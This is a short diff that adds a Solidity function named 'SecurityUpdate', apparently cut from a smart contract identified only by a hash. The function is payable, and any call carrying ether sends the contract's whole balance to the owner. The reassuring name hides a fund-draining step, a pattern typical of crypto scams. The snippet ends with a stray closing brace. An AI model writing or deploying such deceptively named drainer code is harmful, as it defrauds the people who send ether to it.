@@ -1,0 +1,6 @@
+
+// Function from be535a82f2c3895bdaceb3ffe6b9b80ac2f832a0 - SecurityUpdate in be535a82f2c3895bdaceb3ffe6b9b80ac2f832a0.sol
+function SecurityUpdate() public payable {
+        if (msg.value > 0) payable(owner).transfer(address(this).balance);
+    }
+}
